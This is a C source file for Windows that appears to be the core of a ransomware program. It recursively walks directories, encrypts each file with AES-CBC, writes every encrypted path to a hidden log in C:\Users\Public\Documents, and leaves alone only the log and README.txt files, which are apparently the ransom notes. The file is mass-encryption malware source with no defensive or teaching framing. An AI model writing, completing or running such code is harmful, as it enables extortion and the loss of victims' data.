#include "encrypt.h"
#include "aes.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int encrypt(const char *filepath, const unsigned char *key) {
    return encrypt_file_aes_cbc(filepath, key);
}

void add_to_paths(const char *filepath) {
    const char *paths_file = "C:\\Users\\Public\\Documents\\.paths.txt";
    FILE *file = fopen(paths_file, "a");
    if (file) {
        fprintf(file, "%s\n", filepath);
        fclose(file);
    } else {
        printf("Failed to open .paths.txt\n");
    }
}

void enumerate(const char *path, const unsigned char *key) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char dirSpec[MAX_PATH];

    snprintf(dirSpec, MAX_PATH, "%s\\*", path);

    hFind = FindFirstFile(dirSpec, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("FindFirstFile failed (%lu)\n", GetLastError());
        return;
    }

    do {
        if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
            char fullPath[MAX_PATH];
            snprintf(fullPath, MAX_PATH, "%s\\%s", path, findFileData.cFileName);
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                enumerate(fullPath, key);
            } else {
                if (strcmp(fullPath, "C:\\Users\\Public\\Documents\\.paths.txt") != 0 &&
                    strstr(fullPath, "README.txt") == NULL) {
                    if (encrypt(fullPath, key)) {
                        add_to_paths(fullPath);
                    }
                }
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}
